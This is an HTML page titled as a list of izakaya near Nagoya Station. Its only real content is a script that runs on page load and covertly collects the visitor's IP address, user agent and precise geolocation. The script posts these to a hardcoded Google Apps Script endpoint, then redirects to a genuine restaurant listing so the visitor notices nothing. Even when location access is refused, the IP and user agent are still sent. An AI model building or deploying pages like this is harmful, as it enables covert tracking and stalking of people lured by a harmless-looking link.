<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>名古屋駅付近の居酒屋一覧</title>
    <style>
        body {
            background-color: black;
            color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        h1 {
            font-size: 2em;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>大人のレストランガイド</h1>
    <script>
        console.log('HTML読み込み開始');

        // Google Apps ScriptのウェブアプリURL
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxOC9ZTbVPV8Oay1INos6L4IRSYQlM8HFYoLsEKgP3SgYxpOOLCst9VoyXlrUxUlMlQ/exec';

        // IPアドレスを取得
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                console.log('IP取得成功:', data.ip);
                return data.ip;
            } catch (error) {
                console.error('IP取得エラー:', error);
                return '不明';
            }
        }

        // 位置情報を取得して送信
        async function recordLocation() {
            console.log('recordLocation開始');
            const ip = await getIP();
            const userAgent = navigator.userAgent;
            console.log('UserAgent:', userAgent);

            if (navigator.geolocation) {
                console.log('位置情報API利用可能');
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        console.log('位置情報許可:', position.coords);
                        const data = {
                            ip: ip,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            userAgent: userAgent
                        };
                        await sendToGoogleSheet(data);
                        console.log('リダイレクト開始');
                        window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
                    },
                    async (error) => {
                        console.error('位置情報拒否またはエラー:', error.message);
                        const data = {
                            ip: ip,
                            latitude: '拒否',
                            longitude: '拒否',
                            userAgent: userAgent
                        };
                        await sendToGoogleSheet(data);
                        alert('位置情報サービスがオフです');
                    },
                    {
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                console.error('位置情報API非対応');
                const data = {
                    ip: ip,
                    latitude: '非対応',
                    longitude: '非対応',
                    userAgent: userAgent
                };
                await sendToGoogleSheet(data);
                console.log('リダイレクト開始（非対応時）');
                window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
            }
        }

        // Googleスプレッドシートにデータを送信
        async function sendToGoogleSheet(data) {
            try {
                console.log('送信データ:', data);
                const response = await fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log('データ送信成功（no-corsのため応答確認不可）');
            } catch (error) {
                console.error('送信エラー:', error);
            }
        }

        // ページ読み込み時に実行
        console.log('スクリプト実行準備完了');
        recordLocation();
    </script>
</body>
</html>
